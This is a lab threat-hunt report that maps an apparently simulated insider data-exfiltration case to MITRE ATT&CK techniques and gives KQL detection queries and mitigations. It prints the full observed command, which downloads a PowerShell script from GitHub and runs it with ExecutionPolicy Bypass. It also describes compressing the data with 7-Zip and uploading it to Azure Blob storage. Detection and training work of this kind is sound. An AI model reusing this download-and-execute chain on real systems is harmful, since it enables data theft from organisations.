# 🗺️ MITRE ATT&CK Framework Mapping

> **Hunt:** Suspected Data Exfiltration from a PIP'd Employee  
> **Date:** March 27, 2026  
> **Reference:** [MITRE ATT&CK v14](https://attack.mitre.org/)

---

## Overview

This hunt confirmed the most complete **insider threat kill chain** of any exercise in this series. Six TTPs were identified spanning **Execution**, **Collection**, **Exfiltration**, and **Defense Evasion** — making this a multi-stage attack that used entirely legitimate tools to avoid detection.

---

## ATT&CK Navigator Summary

```
EXECUTION             COLLECTION              EXFILTRATION
┌──────────────────┐  ┌──────────────────┐   ┌──────────────────┐
│  T1059.001       │  │  T1560.001       │   │  T1071.001       │
│  PowerShell      │  │  Archive via     │   │  Web Protocols   │
│  -ExecPolicy     │  │  Utility (7zip)  │   │  (HTTPS/443)     │
│  Bypass          │  │  (Confirmed)     │   │  (Confirmed)     │
│  (Confirmed)     │  └──────────────────┘   ├──────────────────┤
└──────────────────┘                          │  T1048           │
                                              │  Exfil Over      │
DEFENSE EVASION                               │  Alt Protocol    │
┌──────────────────┐                          │  (Azure Blob)    │
│  T1027           │                          │  (Confirmed)     │
│  Obfuscated      │                          └──────────────────┘
│  Files           │
│  (Compression)   │  ┌──────────────────┐
│  (Confirmed)     │  │  T1070.004       │
└──────────────────┘  │  File Deletion   │
                       │  (Potential /    │
                       │  Inferred)       │
                       └──────────────────┘
```

---

## Detailed TTP Analysis

### T1560.001 — Archive Collected Data: Archive via Utility

| Field | Detail |
|---|---|
| **Tactic** | Collection |
| **ID** | [T1560.001](https://attack.mitre.org/techniques/T1560/001/) |
| **Status in Hunt** | ✅ Confirmed |
| **Confidence** | High |

**Description:**
Adversaries may use utilities such as 7-Zip, WinRAR, or the built-in `zip` command to compress and archive collected data before exfiltration. Compression reduces file size (faster transfer) and can make file contents less immediately obvious to monitoring tools.

In this hunt, **7-Zip (`7z.exe`) was silently installed** by `exfiltratedata.ps1` and used to compress `employee-data.csv` and other sensitive files into `.zip`/`.7z` archives — a textbook staging-for-exfiltration technique.

**Evidence:**
- `DeviceFileEvents` showing `.zip` file creation initiated by `powershell.exe`
- `DeviceProcessEvents` confirming `7z.exe` installation and archive creation
- Archive names and paths consistent with sensitive employee data

**What makes this particularly concerning:**
- 7-Zip is a legitimate, commonly used tool — unlikely to trigger AV/EDR alerts
- The silent installation left no user-visible prompt
- Compression obscures what data is being transferred

**Detection:**
```kql
DeviceFileEvents
| where ActionType == "FileCreated"
| where FileName endswith ".zip" or FileName endswith ".7z"
| where InitiatingProcessFileName =~ "powershell.exe"
```

**Mitigation:**
- Block or alert on installation of archiving tools by non-IT accounts
- Implement AppLocker/WDAC rules to restrict `7z.exe`, `winrar.exe` to approved users
- Monitor for archive creation in sensitive directories

---

### T1059.001 — Command and Scripting Interpreter: PowerShell

| Field | Detail |
|---|---|
| **Tactic** | Execution |
| **ID** | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) |
| **Status in Hunt** | ✅ Confirmed |
| **Confidence** | High |

**Description:**
PowerShell was the orchestration engine for the entire attack chain — downloading the script, installing 7-Zip, compressing files, and uploading to Azure Blob Storage. The use of `-ExecutionPolicy Bypass` was a deliberate attempt to circumvent standard PowerShell restrictions.

**Evidence:**
- `powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1`
- Script stored at `C:\programdata\` — a writable directory that doesn't require elevated UAC prompts
- Single script automated the complete kill chain

**Full command observed:**
```powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/[...]/exfiltratedata.ps1' `
-OutFile 'C:\programdata\exfiltratedata.ps1'; `
cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1
```

**Detection:**
```kql
DeviceProcessEvents
| where FileName =~ "powershell.exe"
| where ProcessCommandLine has "-ExecutionPolicy Bypass"
| where ProcessCommandLine has_any("exfiltrate", "upload", "transfer", "send")
```

**Mitigation:**
- Enable PowerShell Script Block Logging (captures all script content regardless of bypass)
- Constrained Language Mode — restricts PowerShell capabilities for non-admin users
- Alert on any `-ExecutionPolicy Bypass` usage in production environments

---

### T1071.001 — Application Layer Protocol: Web Protocols (HTTPS)

| Field | Detail |
|---|---|
| **Tactic** | Command and Control / Exfiltration |
| **ID** | [T1071.001](https://attack.mitre.org/techniques/T1071/001/) |
| **Status in Hunt** | ✅ Confirmed |
| **Confidence** | High |

**Description:**
Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering. HTTPS (port 443) is ideal for exfiltration because it is encrypted, universally permitted, and indistinguishable from legitimate web traffic without SSL inspection.

**Evidence:**
- Outbound `ConnectionSuccess` from `powershell.exe` to `sacyberrange00.blob.core.windows.net`
- Destination IP: `20.60.181.193`
- Port: `443` (HTTPS)
- Encrypted traffic — content not visible to standard network monitoring

**Why this technique is so effective:**
Port 443 is the single most allowed port in most corporate firewall rulesets. Without a DLP solution performing SSL/TLS inspection, the contents of this connection are completely opaque to network monitoring tools.

**Detection:**
```kql
DeviceNetworkEvents
| where ActionType == "ConnectionSuccess"
| where InitiatingProcessFileName =~ "powershell.exe"
| where RemotePort == 443
| where RemoteUrl has "blob.core.windows.net"
```

**Mitigation:**
- Deploy DLP with SSL inspection capability
- Alert on PowerShell making outbound HTTPS connections to non-approved domains
- Whitelist-based egress filtering — only approved domains permitted

---

### T1048 — Exfiltration Over Alternative Protocol

| Field | Detail |
|---|---|
| **Tactic** | Exfiltration |
| **ID** | [T1048](https://attack.mitre.org/techniques/T1048/) |
| **Status in Hunt** | ✅ Confirmed |
| **Confidence** | High |

**Description:**
Adversaries may steal data by exfiltrating it over a different protocol than the command and control channel. Using a cloud storage service (Azure Blob Storage) as the exfiltration destination is an increasingly common technique — the destination is a trusted Microsoft domain, unlikely to be blocked, and the traffic looks like legitimate cloud backup activity.

**Evidence:**
- Azure Blob Storage used as exfiltration endpoint (`sacyberrange00.blob.core.windows.net`)
- Blob Storage is a legitimate, widely-used Microsoft service — not blocked by default egress policies
- Traffic indistinguishable from legitimate Azure Blob usage without context

**Detection:**
```kql
DeviceNetworkEvents
| where RemoteUrl has "blob.core.windows.net"
| where InitiatingProcessFileName =~ "powershell.exe"
| where ActionType == "ConnectionSuccess"
```

**Mitigation:**
- Implement DLP policies for cloud storage uploads
- Require approval for corporate data to be uploaded to cloud storage
- Monitor for PowerShell connections to Blob Storage — legitimate business apps don't use PowerShell for this

---

### T1027 — Obfuscated Files or Information

| Field | Detail |
|---|---|
| **Tactic** | Defense Evasion |
| **ID** | [T1027](https://attack.mitre.org/techniques/T1027/) |
| **Status in Hunt** | ✅ Confirmed |
| **Confidence** | Medium |

**Description:**
Adversaries may attempt to make an executable or file difficult to discover or analyse by encrypting, encoding, or otherwise obfuscating its contents. In this hunt, compressing the data into `.zip`/`.7z` archives before exfiltration serves as a form of obfuscation — the file contents are no longer visible in plaintext during transit.

**Evidence:**
- Data compressed into archives before upload — contents hidden from plaintext inspection
- HTTPS encryption of the upload channel provides a second layer of obscuring

**Mitigation:**
- DLP solutions that inspect compressed file contents
- Hash-based monitoring of sensitive files — even compressed, the original files can be tracked by SHA1/MD5

---

### T1070.004 — Indicator Removal: File Deletion (Potential)

| Field | Detail |
|---|---|
| **Tactic** | Defense Evasion |
| **ID** | [T1070.004](https://attack.mitre.org/techniques/T1070/004/) |
| **Status in Hunt** | ⚠️ Not directly observed — Inferred |
| **Confidence** | Low |

**Description:**
Adversaries may delete files left behind by the actions of their intrusion activity. In a real exfiltration scenario, actors commonly delete the archive files and the script itself after successful upload to remove forensic evidence.

**Why it's noted here:**
This TTP was not directly observed, but is commonly associated with this attack pattern. Analysts should check:

```kql
// Check for script or archive deletion after upload
DeviceFileEvents
| where DeviceName == "saranpc2"
| where ActionType == "FileDeleted"
| where FileName has_any("exfiltrate", ".zip", ".7z", "7z.exe")
| order by Timestamp desc
```

**Mitigation:**
- MDE retains deleted file events — file deletion does not remove forensic evidence from MDE logs
- Enable file auditing to ensure deletion events are captured

---

## Full Kill Chain Mapping

```
STAGE 1 — DELIVERY        STAGE 2 — EXECUTION       STAGE 3 — COLLECTION
┌─────────────────────┐   ┌─────────────────────┐   ┌─────────────────────┐
│ exfiltratedata.ps1  │   │ powershell.exe       │   │ 7z.exe installs     │
│ downloaded to       │ → │ -ExecutionPolicy     │ → │ silently            │
│ C:\programdata\     │   │ Bypass               │   │                     │
│ via Invoke-WebReq   │   │ T1059.001            │   │ employee-data.csv   │
│                     │   │                      │   │ compressed to .zip  │
│                     │   │                      │   │ T1560.001           │
└─────────────────────┘   └─────────────────────┘   └─────────────────────┘
                                                               ↓
STAGE 5 — EVASION         STAGE 4 — EXFILTRATION
┌─────────────────────┐   ┌─────────────────────┐
│ • Compression hides │   │ HTTPS upload to      │
│   file content      │   │ sacyberrange00.blob  │
│   T1027             │   │ .core.windows.net    │
│ • HTTPS encrypts    │   │ IP: 20.60.181.193   │
│   traffic           │   │ Port: 443            │
│ • Azure Blob =      │   │ ActionType:          │
│   trusted domain    │   │ ConnectionSuccess    │
│   T1071.001, T1048  │   │                      │
└─────────────────────┘   └─────────────────────┘
```

---

## Detection Coverage Assessment

| TTP | Detected During Hunt? | Automated Rule Exists? | Recommended Rule |
|---|---|---|---|
| T1560.001 — Archive via Utility | ✅ Yes (DeviceFileEvents) | ❌ No | Archive creation by PowerShell alert |
| T1059.001 — PowerShell | ✅ Yes (DeviceProcessEvents) | ❌ No | ExecutionPolicy Bypass alert |
| T1071.001 — Web Protocols | ✅ Yes (DeviceNetworkEvents) | ❌ No | PowerShell → cloud storage alert |
| T1048 — Alt Protocol Exfil | ✅ Yes (DeviceNetworkEvents) | ❌ No | Blob Storage connection alert |
| T1027 — Obfuscation | ✅ Yes (inferred from archives) | ❌ No | DLP with compressed file inspection |
| T1070.004 — File Deletion | ⚠️ Not observed | ❌ No | Deletion of script/archive files alert |

**Critical gap:** None of these TTPs had automated detections — the hunt was triggered purely by a management tip-off, not a security alert. All six should be converted to detection rules.

---

## References

- [MITRE ATT&CK T1560.001](https://attack.mitre.org/techniques/T1560/001/)
- [MITRE ATT&CK T1059.001](https://attack.mitre.org/techniques/T1059/001/)
- [MITRE ATT&CK T1071.001](https://attack.mitre.org/techniques/T1071/001/)
- [MITRE ATT&CK T1048](https://attack.mitre.org/techniques/T1048/)
- [MITRE ATT&CK T1027](https://attack.mitre.org/techniques/T1027/)
- [MITRE ATT&CK T1070.004](https://attack.mitre.org/techniques/T1070/004/)

---

*Mapping authored by: Saran | CyberRange Lab | March 27, 2026*
